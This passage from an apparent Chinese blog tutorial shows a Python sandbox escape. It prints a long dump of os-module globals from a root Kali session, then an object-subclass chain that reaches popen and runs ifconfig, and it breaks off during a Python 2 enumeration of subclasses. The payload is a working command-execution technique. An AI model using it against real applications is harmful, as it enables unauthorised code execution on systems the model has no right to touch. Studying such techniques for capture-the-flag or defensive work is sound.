class="string">&#x27;SC_MQ_PRIO_MAX&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;SC_NGROUPS_MAX&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;SC_NL_ARGMAX&#x27;</span>: <span class="number">119</span>, <span class="string">&#x27;SC_NL_LANGMAX&#x27;</span>: <span class="number">120</span>, <span class="string">&#x27;SC_NL_MSGMAX&#x27;</span>: <span class="number">121</span>, <span class="string">&#x27;SC_NL_NMAX&#x27;</span>: <span class="number">122</span>, <span class="string">&#x27;SC_NL_SETMAX&#x27;</span>: <span class="number">123</span>, <span class="string">&#x27;SC_NL_TEXTMAX&#x27;</span>: <span class="number">124</span>, <span class="string">&#x27;SC_NPROCESSORS_CONF&#x27;</span>: <span class="number">83</span>, <span class="string">&#x27;SC_NPROCESSORS_ONLN&#x27;</span>: <span class="number">84</span>, <span class="string">&#x27;SC_NZERO&#x27;</span>: <span class="number">109</span>, <span class="string">&#x27;SC_OPEN_MAX&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;SC_PAGESIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PAGE_SIZE&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;SC_PASS_MAX&#x27;</span>: <span class="number">88</span>, <span class="string">&#x27;SC_PHYS_PAGES&#x27;</span>: <span class="number">85</span>, <span class="string">&#x27;SC_PII&#x27;</span>: <span class="number">53</span>, <span class="string">&#x27;SC_PII_INTERNET&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;SC_PII_INTERNET_DGRAM&#x27;</span>: <span class="number">62</span>, <span class="string">&#x27;SC_PII_INTERNET_STREAM&#x27;</span>: <span class="number">61</span>, <span class="string">&#x27;SC_PII_OSI&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;SC_PII_OSI_CLTS&#x27;</span>: <span class="number">64</span>, <span class="string">&#x27;SC_PII_OSI_COTS&#x27;</span>: <span class="number">63</span>, <span class="string">&#x27;SC_PII_OSI_M&#x27;</span>: <span class="number">65</span>, <span class="string">&#x27;SC_PII_SOCKET&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;SC_PII_XTI&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;SC_POLL&#x27;</span>: <span class="number">58</span>, <span class="string">&#x27;SC_PRIORITIZED_IO&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;SC_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;SC_REALTIME_SIGNALS&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;SC_RE_DUP_MAX&#x27;</span>: <span class="number">44</span>, <span class="string">&#x27;SC_RTSIG_MAX&#x27;</span>: <span class="number">31</span>, <span class="string">&#x27;SC_SAVED_IDS&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;SC_SCHAR_MAX&#x27;</span>: <span class="number">111</span>, <span class="string">&#x27;SC_SCHAR_MIN&#x27;</span>: <span class="number">112</span>, <span class="string">&#x27;SC_SELECT&#x27;</span>: <span class="number">59</span>, <span class="string">&#x27;SC_SEMAPHORES&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;SC_SEM_NSEMS_MAX&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;SC_SEM_VALUE_MAX&#x27;</span>: <span class="number">33</span>, <span class="string">&#x27;SC_SHARED_MEMORY_OBJECTS&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;SC_SHRT_MAX&#x27;</span>: <span class="number">113</span>, <span class="string">&#x27;SC_SHRT_MIN&#x27;</span>: <span class="number">114</span>, <span class="string">&#x27;SC_SIGQUEUE_MAX&#x27;</span>: <span class="number">34</span>, <span class="string">&#x27;SC_SSIZE_MAX&#x27;</span>: <span class="number">110</span>, <span class="string">&#x27;SC_STREAM_MAX&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;SC_SYNCHRONIZED_IO&#x27;</span>: <span class="number">14</span>, <span class="string">&#x27;SC_THREADS&#x27;</span>: <span class="number">67</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKADDR&#x27;</span>: <span class="number">77</span>, <span class="string">&#x27;SC_THREAD_ATTR_STACKSIZE&#x27;</span>: <span class="number">78</span>, <span class="string">&#x27;SC_THREAD_DESTRUCTOR_ITERATIONS&#x27;</span>: <span class="number">73</span>, <span class="string">&#x27;SC_THREAD_KEYS_MAX&#x27;</span>: <span class="number">74</span>, <span class="string">&#x27;SC_THREAD_PRIORITY_SCHEDULING&#x27;</span>: <span class="number">79</span>, <span class="string">&#x27;SC_THREAD_PRIO_INHERIT&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;SC_THREAD_PRIO_PROTECT&#x27;</span>: <span class="number">81</span>, <span class="string">&#x27;SC_THREAD_PROCESS_SHARED&#x27;</span>: <span class="number">82</span>, <span class="string">&#x27;SC_THREAD_SAFE_FUNCTIONS&#x27;</span>: <span class="number">68</span>, <span class="string">&#x27;SC_THREAD_STACK_MIN&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;SC_THREAD_THREADS_MAX&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;SC_TIMERS&#x27;</span>: <span class="number">11</span>, <span class="string">&#x27;SC_TIMER_MAX&#x27;</span>: <span class="number">35</span>, <span class="string">&#x27;SC_TTY_NAME_MAX&#x27;</span>: <span class="number">72</span>, <span class="string">&#x27;SC_TZNAME_MAX&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;SC_T_IOV_MAX&#x27;</span>: <span class="number">66</span>, <span class="string">&#x27;SC_UCHAR_MAX&#x27;</span>: <span class="number">115</span>, <span class="string">&#x27;SC_UINT_MAX&#x27;</span>: <span class="number">116</span>, <span class="string">&#x27;SC_UIO_MAXIOV&#x27;</span>: <span class="number">60</span>, <span class="string">&#x27;SC_ULONG_MAX&#x27;</span>: <span class="number">117</span>, <span class="string">&#x27;SC_USHRT_MAX&#x27;</span>: <span class="number">118</span>, <span class="string">&#x27;SC_VERSION&#x27;</span>: <span class="number">29</span>, <span class="string">&#x27;SC_WORD_BIT&#x27;</span>: <span class="number">107</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFF32&#x27;</span>: <span class="number">125</span>, <span class="string">&#x27;SC_XBS5_ILP32_OFFBIG&#x27;</span>: <span class="number">126</span>, <span class="string">&#x27;SC_XBS5_LP64_OFF64&#x27;</span>: <span class="number">127</span>, <span class="string">&#x27;SC_XBS5_LPBIG_OFFBIG&#x27;</span>: <span class="number">128</span>, <span class="string">&#x27;SC_XOPEN_CRYPT&#x27;</span>: <span class="number">92</span>, <span class="string">&#x27;SC_XOPEN_ENH_I18N&#x27;</span>: <span class="number">93</span>, <span class="string">&#x27;SC_XOPEN_LEGACY&#x27;</span>: <span class="number">129</span>, <span class="string">&#x27;SC_XOPEN_REALTIME&#x27;</span>: <span class="number">130</span>, <span class="string">&#x27;SC_XOPEN_REALTIME_THREADS&#x27;</span>: <span class="number">131</span>, <span class="string">&#x27;SC_XOPEN_SHM&#x27;</span>: <span class="number">94</span>, <span class="string">&#x27;SC_XOPEN_UNIX&#x27;</span>: <span class="number">91</span>, <span class="string">&#x27;SC_XOPEN_VERSION&#x27;</span>: <span class="number">89</span>, <span class="string">&#x27;SC_XOPEN_XCU_VERSION&#x27;</span>: <span class="number">90</span>, <span class="string">&#x27;SC_XOPEN_XPG2&#x27;</span>: <span class="number">98</span>, <span class="string">&#x27;SC_XOPEN_XPG3&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;SC_XOPEN_XPG4&#x27;</span>: <span class="number">100</span>&#125;, <span class="string">&#x27;error&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;OSError&#x27;</span>&gt;, <span class="string">&#x27;waitid_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.waitid_result&#x27;</span>&gt;, <span class="string">&#x27;stat_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.stat_result&#x27;</span>&gt;, <span class="string">&#x27;statvfs_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.statvfs_result&#x27;</span>&gt;, <span class="string">&#x27;sched_param&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.sched_param&#x27;</span>&gt;, <span class="string">&#x27;terminal_size&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.terminal_size&#x27;</span>&gt;, <span class="string">&#x27;DirEntry&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.DirEntry&#x27;</span>&gt;, <span class="string">&#x27;times_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.times_result&#x27;</span>&gt;, <span class="string">&#x27;uname_result&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;posix.uname_result&#x27;</span>&gt;, <span class="string">&#x27;_exit&#x27;</span>: &lt;built-<span class="keyword">in</span> function _exit&gt;, <span class="string">&#x27;path&#x27;</span>: &lt;module <span class="string">&#x27;posixpath&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python3.9/posixpath.py&#x27;</span>&gt;, <span class="string">&#x27;curdir&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;pardir&#x27;</span>: <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;sep&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;pathsep&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;defpath&#x27;</span>: <span class="string">&#x27;/bin:/usr/bin&#x27;</span>, <span class="string">&#x27;extsep&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;altsep&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;devnull&#x27;</span>: <span class="string">&#x27;/dev/null&#x27;</span>, <span class="string">&#x27;supports_dir_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function mknod&gt;, &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function mkfifo&gt;, &lt;built-<span class="keyword">in</span> function readlink&gt;, &lt;built-<span class="keyword">in</span> function unlink&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function mkdir&gt;, &lt;built-<span class="keyword">in</span> function rename&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function rmdir&gt;, &lt;built-<span class="keyword">in</span> function symlink&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_effective_ids&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;supports_fd&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function scandir&gt;, &lt;built-<span class="keyword">in</span> function execve&gt;, &lt;built-<span class="keyword">in</span> function statvfs&gt;, &lt;built-<span class="keyword">in</span> function truncate&gt;, &lt;built-<span class="keyword">in</span> function listdir&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function chmod&gt;, &lt;built-<span class="keyword">in</span> function chdir&gt;, &lt;built-<span class="keyword">in</span> function pathconf&gt;&#125;, <span class="string">&#x27;supports_follow_symlinks&#x27;</span>: &#123;&lt;built-<span class="keyword">in</span> function chown&gt;, &lt;built-<span class="keyword">in</span> function link&gt;, &lt;built-<span class="keyword">in</span> function stat&gt;, &lt;built-<span class="keyword">in</span> function utime&gt;, &lt;built-<span class="keyword">in</span> function access&gt;&#125;, <span class="string">&#x27;SEEK_SET&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;SEEK_CUR&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;SEEK_END&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;makedirs&#x27;</span>: &lt;function makedirs at <span class="number">0x7fc7ef547af0</span>&gt;, <span class="string">&#x27;removedirs&#x27;</span>: &lt;function removedirs at <span class="number">0x7fc7ef46b280</span>&gt;, <span class="string">&#x27;renames&#x27;</span>: &lt;function renames at <span class="number">0x7fc7ef46b310</span>&gt;, <span class="string">&#x27;walk&#x27;</span>: &lt;function walk at <span class="number">0x7fc7ef46b3a0</span>&gt;, <span class="string">&#x27;_walk&#x27;</span>: &lt;function _walk at <span class="number">0x7fc7ef46b430</span>&gt;, <span class="string">&#x27;fwalk&#x27;</span>: &lt;function fwalk at <span class="number">0x7fc7ef46b4c0</span>&gt;, <span class="string">&#x27;_fwalk&#x27;</span>: &lt;function _fwalk at <span class="number">0x7fc7ef46b550</span>&gt;, <span class="string">&#x27;execl&#x27;</span>: &lt;function execl at <span class="number">0x7fc7ef46b5e0</span>&gt;, <span class="string">&#x27;execle&#x27;</span>: &lt;function execle at <span class="number">0x7fc7ef46b670</span>&gt;, <span class="string">&#x27;execlp&#x27;</span>: &lt;function execlp at <span class="number">0x7fc7ef46b700</span>&gt;, <span class="string">&#x27;execlpe&#x27;</span>: &lt;function execlpe at <span class="number">0x7fc7ef46b790</span>&gt;, <span class="string">&#x27;execvp&#x27;</span>: &lt;function execvp at <span class="number">0x7fc7ef46b820</span>&gt;, <span class="string">&#x27;execvpe&#x27;</span>: &lt;function execvpe at <span class="number">0x7fc7ef46b8b0</span>&gt;, <span class="string">&#x27;_execvpe&#x27;</span>: &lt;function _execvpe at <span class="number">0x7fc7ef46b940</span>&gt;, <span class="string">&#x27;get_exec_path&#x27;</span>: &lt;function get_exec_path at <span class="number">0x7fc7ef46b9d0</span>&gt;, <span class="string">&#x27;MutableMapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.MutableMapping&#x27;</span>&gt;, <span class="string">&#x27;Mapping&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;collections.abc.Mapping&#x27;</span>&gt;, <span class="string">&#x27;_Environ&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._Environ&#x27;</span>&gt;, <span class="string">&#x27;getenv&#x27;</span>: &lt;function getenv at <span class="number">0x7fc7ef46ba60</span>&gt;, <span class="string">&#x27;supports_bytes_environ&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;environb&#x27;</span>: environ(&#123;<span class="string">b&#x27;COLORTERM&#x27;</span>: <span class="string">b&#x27;truecolor&#x27;</span>, <span class="string">b&#x27;DISPLAY&#x27;</span>: <span class="string">b&#x27;:0.0&#x27;</span>, <span class="string">b&#x27;LANG&#x27;</span>: <span class="string">b&#x27;en_US.UTF-8&#x27;</span>, <span class="string">b&#x27;LANGUAGE&#x27;</span>: <span class="string">b&#x27;&#x27;</span>, <span class="string">b&#x27;PATH&#x27;</span>: <span class="string">b&#x27;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games&#x27;</span>, <span class="string">b&#x27;TERM&#x27;</span>: <span class="string">b&#x27;xterm-256color&#x27;</span>, <span class="string">b&#x27;XAUTHORITY&#x27;</span>: <span class="string">b&#x27;/home/kali/.Xauthority&#x27;</span>, <span class="string">b&#x27;LS_COLORS&#x27;</span>: <span class="string">b&#x27;rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36::ow=30;44:&#x27;</span>, <span class="string">b&#x27;MAIL&#x27;</span>: <span class="string">b&#x27;/var/mail/root&#x27;</span>, <span class="string">b&#x27;LOGNAME&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;USER&#x27;</span>: <span class="string">b&#x27;root&#x27;</span>, <span class="string">b&#x27;HOME&#x27;</span>: <span class="string">b&#x27;/root&#x27;</span>, <span class="string">b&#x27;SHELL&#x27;</span>: <span class="string">b&#x27;/usr/bin/zsh&#x27;</span>, <span class="string">b&#x27;SUDO_COMMAND&#x27;</span>: <span class="string">b&#x27;/usr/bin/su&#x27;</span>, <span class="string">b&#x27;SUDO_USER&#x27;</span>: <span class="string">b&#x27;kali&#x27;</span>, <span class="string">b&#x27;SUDO_UID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;SUDO_GID&#x27;</span>: <span class="string">b&#x27;1000&#x27;</span>, <span class="string">b&#x27;COMMAND_NOT_FOUND_INSTALL_PROMPT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;POWERSHELL_UPDATECHECK&#x27;</span>: <span class="string">b&#x27;Off&#x27;</span>, <span class="string">b&#x27;POWERSHELL_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;DOTNET_CLI_TELEMETRY_OPTOUT&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;SHLVL&#x27;</span>: <span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;PWD&#x27;</span>: <span class="string">b&#x27;/home/kali/Desktop&#x27;</span>, <span class="string">b&#x27;OLDPWD&#x27;</span>: <span class="string">b&#x27;/home/kali&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_mb&#x27;</span>: <span class="string">b&#x27;\x1b[1;31m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_md&#x27;</span>: <span class="string">b&#x27;\x1b[1;36m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_me&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_so&#x27;</span>: <span class="string">b&#x27;\x1b[01;33m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_se&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_us&#x27;</span>: <span class="string">b&#x27;\x1b[1;32m&#x27;</span>, <span class="string">b&#x27;LESS_TERMCAP_ue&#x27;</span>: <span class="string">b&#x27;\x1b[0m&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>: <span class="string">b&#x27;/usr/bin/python3&#x27;</span>&#125;), <span class="string">&#x27;getenvb&#x27;</span>: &lt;function getenvb at <span class="number">0x7fc7ef46d3a0</span>&gt;, <span class="string">&#x27;fsencode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsencode at <span class="number">0x7fc7ef46d4c0</span>&gt;, <span class="string">&#x27;fsdecode&#x27;</span>: &lt;function _fscodec.&lt;<span class="built_in">locals</span>&gt;.fsdecode at <span class="number">0x7fc7ef46d550</span>&gt;, <span class="string">&#x27;P_WAIT&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;P_NOWAIT&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;P_NOWAITO&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;_spawnvef&#x27;</span>: &lt;function _spawnvef at <span class="number">0x7fc7ef46d430</span>&gt;, <span class="string">&#x27;spawnv&#x27;</span>: &lt;function spawnv at <span class="number">0x7fc7ef46d5e0</span>&gt;, <span class="string">&#x27;spawnve&#x27;</span>: &lt;function spawnve at <span class="number">0x7fc7ef46d670</span>&gt;, <span class="string">&#x27;spawnvp&#x27;</span>: &lt;function spawnvp at <span class="number">0x7fc7ef46d700</span>&gt;, <span class="string">&#x27;spawnvpe&#x27;</span>: &lt;function spawnvpe at <span class="number">0x7fc7ef46d790</span>&gt;, <span class="string">&#x27;spawnl&#x27;</span>: &lt;function spawnl at <span class="number">0x7fc7ef46d820</span>&gt;, <span class="string">&#x27;spawnle&#x27;</span>: &lt;function spawnle at <span class="number">0x7fc7ef46d8b0</span>&gt;, <span class="string">&#x27;spawnlp&#x27;</span>: &lt;function spawnlp at <span class="number">0x7fc7ef46d940</span>&gt;, <span class="string">&#x27;spawnlpe&#x27;</span>: &lt;function spawnlpe at <span class="number">0x7fc7ef46d9d0</span>&gt;, <span class="string">&#x27;popen&#x27;</span>: &lt;function popen at <span class="number">0x7fc7ef46da60</span>&gt;, <span class="string">&#x27;_wrap_close&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;, <span class="string">&#x27;fdopen&#x27;</span>: &lt;function fdopen at <span class="number">0x7fc7ef46daf0</span>&gt;, <span class="string">&#x27;_fspath&#x27;</span>: &lt;function _fspath at <span class="number">0x7fc7ef46dee0</span>&gt;, <span class="string">&#x27;PathLike&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;os.PathLike&#x27;</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>找到popen函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;ifconfig&quot;</span>).read()</span><br><span class="line"><span class="string">&#x27;eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.18.69.174  netmask 255.255.248.0  broadcast 10.18.71.255\n        inet6 fe80::20c:29ff:fe7d:da26  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:0c:29:7d:da:26  txqueuelen 1000  (Ethernet)\n        RX packets 16954  bytes 8157718 (7.7 MiB)\n        RX errors 0  dropped 1538  overruns 0  frame 0\n        TX packets 5464  bytes 503024 (491.2 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 187  bytes 17050 (16.6 KiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 187  bytes 17050 (16.6 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n&#x27;</span></span><br></pre></td></tr></table></figure><p>如果是python2那么还是用这个方法找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>([].__class__.__bases__[<span class="number">0</span>].__subclasses__()): </span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">(<span class="number">0</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">1</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">2</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">3</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">4</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">5</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">6</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">7</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">8</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">9</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">10</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">11</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">12</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">13</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">14</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">15</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">16</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">17</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">18</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">19</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">20</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">21</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">22</span>, &lt;<span class="built_in">type</span> <span 